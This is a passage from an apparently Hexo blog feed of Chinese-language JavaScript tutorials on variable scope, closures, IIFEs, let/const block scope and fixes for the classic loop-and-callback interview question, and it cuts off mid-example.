被调用。</p><blockquote><p>作者：leiting1998<br>链接：<a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">https://juejin.im/post/5abb99e9f265da2392366824</a><br>来源：掘金</p></blockquote><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token function">show</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 10，词法作用域</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈JavaScript的作用域</title>
      <link href="2018/11/01/JavaScript-%E8%B0%88%E8%B0%88JavaScript%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>2018/11/01/JavaScript-%E8%B0%88%E8%B0%88JavaScript%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>作用域，是指变量的生命周期（一个变量在哪些范围内保持一定值）。</p><blockquote><p>全局变量：</p><p>生命周期将存在于整个程序之内。</p><p>能被程序中任何函数或者方法访问。</p><p>在 JavaScript 内默认是可以被修改的。</p></blockquote><p>全局变量，虽然好用，但是是非常可怕的，这是所有程序员公认的事实。</p><h5 id="显式声明："><a href="#显式声明：" class="headerlink" title="显式声明："></a>显式声明：</h5><p>带有关键字 var 的声明；</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> testFunc <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'just test'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**---------全局变量会挂载到 window 对象上------------**/</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testFunc<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// ƒ () { console.log('just test') }</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testValue<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 123</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>复制代码</code></pre><p><strong>其实，我们写的函数如果不经过封装，也会是全局变量，他的生命周期也就是全局作用域；</strong></p><h5 id="隐式声明："><a href="#隐式声明：" class="headerlink" title="隐式声明："></a>隐式声明：</h5><p>不带有<strong>声明关键字</strong>的变量，JS 会默认帮你声明一个全局变量！！！</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 没有用 var 修饰</span>      <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 124</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 124 &lt;=  挂在了 window全局对象上 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>复制代码</code></pre><p>现在，变量 <code>result</code> 被挂载到 <code>window</code> 对象上了！！！</p><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>函数作用域内，对外是封闭的，从外层的作用域无法直接访问函数内部的作用域！！！</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 报错：ReferenceError: testValue is not defined</span></code></pre><h5 id="通过-return-访问函数内部变量："><a href="#通过-return-访问函数内部变量：" class="headerlink" title="通过 return 访问函数内部变量："></a>通过 return 访问函数内部变量：</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> testValue <span class="token operator">+</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token string">'fun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "innerfun"</span>复制代码</code></pre><p>函数就像一个工厂，我们输入一些东西，它在内部加工，然后给我们一个加工产物；</p><h5 id="通过-闭包-访问函数内部变量："><a href="#通过-闭包-访问函数内部变量：" class="headerlink" title="通过 闭包 访问函数内部变量："></a>通过 闭包 访问函数内部变量：</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> rusult <span class="token operator">=</span> testValue <span class="token operator">+</span> value<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">innser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> rusult<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">innser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token string">'fun'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "innerfun"</span></code></pre><p>关于闭包，我不会在这篇文章过多描述，因为，想要描述闭包，本身需要跟本文章一样的长度；</p><h5 id="立即执行函数："><a href="#立即执行函数：" class="headerlink" title="立即执行函数："></a>立即执行函数：</h5><p>这是个很实用的函数，很多库都用它分离全局作用域，形成一个单独的函数作用域；</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> testFunc <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'just test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// undefined</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>testFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// undefined</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>它能够自动执行 <code>(function() { //... })()</code> 里面包裹的内容，能够很好地消除全局变量的影响；</p><h3 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h3><p>在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生；</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 5</span></code></pre><p>很明显，用 var 关键字声明的变量，在 <code>for</code> 循环之后仍然被保存这个作用域里；</p><p>这可以说明： <code>for() { }</code>仍然在，全局作用域里，并没有产生像函数作用域一样的封闭效果；</p><p>如果想要实现 <strong>块级作用域</strong> 那么我们需要用 <code>let</code> 关键字声明！！！</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 报错：ReferenceError: i is not defined</span></code></pre><p><strong>在 for 循环执行完毕之后 i 变量就被释放了，它已经消失了！！！</strong></p><p>同样能形成块级作用域的还有 <code>const</code> 关键字：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 报错：ReferenceError: a is not defined</span></code></pre><p><code>let</code> 和 <code>const</code> 关键字，创建块级作用域的条件是必须有一个 <code>{ }</code> 包裹：</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ......</span></code></pre><p>不要小看块级作用域，它能帮你做很多事情，举个栗子：</p><p>举一个面试中常见的例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 5 5 5 5 5</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>这几乎是作用域的必考题目，你会觉得这种结果很奇怪，但是事实就是这么发生了；</p><p>这里的 i 是在全局作用域里面的，只存在 1 个值，等到回调函数执行时，用词法作用域捕获的 i 就只能是 5；</p><p>因为这个循环计算的 i 值在回调函数结束之前就已经执行到 5 了；我们应该如何让它恢复正常呢？？？</p><p><strong>解法1：调用函数，创建函数作用域：</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">abc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 0 1 2 3 4 </span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>这里相当于创建了5个函数作用域来保存，我们的 i 值；</p><p><strong>解法2：采用立即执行函数，创建函数作用域；</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>原理同上，只不过换成了自动执行这个函数罢了，这里保存了 5 次 i 的值；</p><p><strong>解法3：let  创建块级作用域，可以将块级作用域理解为: 使用let和const声明的变量, 只在当前大括号内生效 </strong> </p><pre class=" language-js"><code class="language-js"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>这里的大括号内主要指的是一下几种情况</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 条件语句</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// switch语句</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// for / while循环语句</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// try...catch语句</span><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 单大括号</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>for循环问题的解决</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第一个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第二个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第三个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>第四个<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">let</span> oli <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// //相当于</span>    <span class="token keyword">var</span> i    i<span class="token operator">=</span><span class="token number">0</span>    oli<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    i<span class="token operator">=</span><span class="token number">1</span>    oli<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    i<span class="token operator">=</span><span class="token number">2</span>    oli<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    i<span class="token operator">=</span><span class="token number">3</span>    oli<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//按照词法作用域查找，会每次都找到全局的i</span>    <span class="token comment" spellcheck="true">//方法一：改为let</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 《深入理解ES6》上面说循环中的let声明在循环内部是标准中专门定义的</span>    <span class="token comment" spellcheck="true">// 而是每次let声明都会创建一个新的变量i，并将其初始化为i的当前值</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token comment" spellcheck="true">//i，暂存的思想</span>        oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//这个时候在执行点击事件时，i会在for循环的第一行找到i的值</span>    <span class="token comment" spellcheck="true">//方法二：闭包</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>            oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//方法三：暂存数据,和let原理类似</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index <span class="token operator">=</span> i        oli<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//方法四：事件委托</span>    <span class="token keyword">var</span> oul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    oul<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> e <span class="token operator">=</span> e <span class="token operator">||</span> window<span class="token punctuation">.</span>event        <span class="token keyword">var</span> target <span class="token operator">=</span> e<span class="token punctuation">.</span>target <span class="token operator">||</span> e<span class="token punctuation">.</span>srcElement        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>nodeName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> li<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> index <span class="token operator">=</span> Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>indexOf<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>li<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>　　　　    <span class="token punctuation">}</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p>词法作用域是指一个变量的可见性，及其文本表述的模拟值（《JavaScript函数式编程》）;</p><p>听起来，十分地晦涩，不过将代码拿来分析就非常浅显易懂了；</p><pre class=" language-js"><code class="language-js">testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">afun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'middle'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token 